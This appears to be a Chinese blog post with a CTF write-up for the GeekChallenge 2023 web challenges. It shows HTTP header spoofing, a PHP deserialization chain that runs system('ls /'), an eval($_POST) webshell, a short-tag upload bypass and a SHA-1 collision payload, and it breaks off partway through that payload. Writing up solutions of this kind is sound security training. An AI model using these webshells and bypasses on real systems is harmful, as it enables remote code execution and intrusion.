

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
  <link rel="icon" href="/img/I.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Infernity">
  <meta name="keywords" content="">
  
    <meta name="description" content="by:Infernity EzHttp请post传参username和password进行登录 第一步先找username和password，查看源码发现“**密码记在了不想让爬虫获取的地方!**” 查阅资料， 1几乎所有的搜索引擎爬虫，都会遵守robots协议  那么打开robots.txt，再进入&#x2F;o2takuXX’s_username_and_password.txt 发现user">
<meta property="og:type" content="article">
<meta property="og:title" content="GeekChallenge 2023 WEB赛题目WP">
<meta property="og:url" content="http://example.com/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/index.html">
<meta property="og:site_name" content="Infernity&#39;s Blog">
<meta property="og:description" content="by:Infernity EzHttp请post传参username和password进行登录 第一步先找username和password，查看源码发现“**密码记在了不想让爬虫获取的地方!**” 查阅资料， 1几乎所有的搜索引擎爬虫，都会遵守robots协议  那么打开robots.txt，再进入&#x2F;o2takuXX’s_username_and_password.txt 发现user">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic1.zhimg.com/v2-0dda71bc9ced142bf7bb2d6adbebe4f0_r.jpg">
<meta property="article:published_time" content="2023-11-28T06:01:24.000Z">
<meta property="article:modified_time" content="2025-01-20T02:31:19.617Z">
<meta property="article:author" content="Infernity">
<meta property="article:tag" content="WPs">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://pic1.zhimg.com/v2-0dda71bc9ced142bf7bb2d6adbebe4f0_r.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>GeekChallenge 2023 WEB赛题目WP - Infernity&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Infernity&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/friends/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>friends</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle">GeekChallenge 2023 WEB赛题目WP</span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-11-28 14:01" pubdate>
          2023年11月28日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          72 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">GeekChallenge 2023 WEB赛题目WP</h1>
            
            
              <div class="markdown-body">
                
                <p>by:Infernity</p>
<h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p>请post传参username和password进行登录</p>
<p>第一步先找username和password，查看源码发现“**密码记在了不想让爬虫获取的地方!**”</p>
<p>查阅资料，</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">几乎所有的搜索引擎爬虫，都会遵守robots协议<br></code></pre></td></tr></table></figure>

<p>那么打开robots.txt，再进入&#x2F;o2takuXX’s_username_and_password.txt</p>
<p>发现username和password</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin<br><span class="hljs-symbol">password:</span>@dm1N123456r00t<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p>返回index.php，继续传参后：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">必须来源自sycsec.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>

<p>那么修改Referer为sycsec.com</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请使用Syclover浏览器<br></code></pre></td></tr></table></figure>

<p>那么修改User-Agent为Syclover</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请从localhost访问<br></code></pre></td></tr></table></figure>

<p>那么添加一句x-forwarded-for:127.0.0.1</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请使用Syc.vip代理<br></code></pre></td></tr></table></figure>

<p>那么添加一句via:Syc.vip</p>
<p>然后代码审计php，$_SERVER是获取请求头里的参数值，后面是HTTP_O2TAKUXX，我们去掉HTTP_在请求头里加一句：O2TAKUXX：GiveMeFlag</p>
<p>爆出flag：SYC{HttP_1s_E@sY}</p>
<h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><p>反序列化，好诶！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先看末尾，web这个类里有明显的提示eva1长得像eval勒，肯定就是这里命令执行输出flag，我们写eva1&#x3D;’system’，interesting&#x3D;’ls &#x2F;‘</p>
<p>那么我们肯定要先进入这个方法：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__get</span>()    			<span class="hljs-comment">//用于从不可访问的属性读取数据</span><br></code></pre></td></tr></table></figure>

<p>那肯定就要往上看了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>lover这个类里面最后return $this-&gt;yxx-&gt;QW;我们只需要将yyx和QW随便设置一个值，反正随便设置的肯定没法访问，所以就能触发get()方法，我这里设置yxx&#x3D;’a’，QW&#x3D;’a’</p>
<p>要这样用，肯定就要触发invoke()方法，</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__invoke</span>()   		<span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br></code></pre></td></tr></table></figure>

<p>就要看最上面的一个类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里$function&#x3D;$this-&gt;cuit;把cuit的值赋给function，然后return $function();这里就触发invoke()方法，</p>
<p>这里也不用管cuit到底是什么，反正都会将对象调用为函数而出发invoke()我这里设置cuit&#x3D;’a’</p>
<p>而destruct()方法是在这里会自动触发，所以不用管。</p>
<p>最终代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;ls /&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>把输出传入题中，发现返回了ls &#x2F;的执行情况，那么这道题就解决了。</p>
<p>SYC{wqle9ssXk9cB7fhYly}</p>
<h4 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h4><p>文件上传，先传一个jpg文件看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>说我后缀过了，头部过了，你上传的内容一看就是木马</p>
<p>说明有文件内容检查，经过尝试，发现会过滤&lt;?php，那么使用php短标签试试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>          等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#不需要开启参数设置</span><br></code></pre></td></tr></table></figure>

<p>传入123.php</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span>(<span class="hljs-string">`ls`</span>)<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>发现上传成功，进入文件目录，发现回显了本目录下的所有东西，那么这道题解决了。</p>
<p>（这道题还是动态flag&#x3D;-&#x3D;）</p>
<p>SYC{hUR1ep7TkikaVYaoiM}</p>
<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>php代码审计</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;syc&#x27;</span>])</span></span><br></code></pre></td></tr></table></figure>

<p>这一句^和$的作用是从头到尾匹配，说明我们不能在前后增减字符，只能是他给的这个字符串，但是</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$_GET[&#x27;syc&#x27;] !== &#x27;Welcome to GEEK <span class="hljs-number">2023</span>!&#x27;<br></code></pre></td></tr></table></figure>

<p>后面又让我们传入的syc不等于他给的字符串怎么办勒，关键就是第一句prge_match的修饰符&#x2F;i</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ regexp /</span> i                      不区分大小写的匹配 <br></code></pre></td></tr></table></figure>

<p>那么，我们只需要在原字符串上随便修改一个大小写就成功进入if，传入syc&#x3D;Welcome to GEEk 2023!</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">intval</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;lover&#x27;</span>])</span></span> &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-built_in">intval</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;lover&#x27;</span>]</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure>

<p>这一句intval函数是取得变量的整数部分，如果是字符串就为0,如果是数字和字符串，取得第一个遇到的数字的值。这里让lover&lt;2023 加1后又大于2024，怎么办嘞，我们利用intval函数和php传参时的性质：</p>
<p>我们知道php传入的参数都是字符串，而且php中数字有特殊的表示方式，比如科学技术法。</p>
<p>我们传入lover&#x3D;2e4，传入2e4后因为会被识别成字符串，intval函数就会取第一个数字的值，即为2,这里就小于了2023，后面’2e4’+1这里进行了运算，php就会认为2e4不是字符串而是个数字，即是20000+1&#x3D;20001&gt;2024</p>
<p>这里就进入了if。</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$array1 = (<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;qw&#x27;</span>]<span class="hljs-comment">;</span><br>$array2 = (<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;yxx&#x27;</span>]<span class="hljs-comment">;</span><br><span class="hljs-keyword">if</span> (sha1($array1) === sha1($array2))<br></code></pre></td></tr></table></figure>

<p>这里强制把我们传入的qw和yxx转成了字符串，那么平时强比较绕过的方法就失效了，我们必须找sha1确实相等的两个字符串。经过查找sha1碰撞：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">qw<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br>&amp;<br>yxx<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span 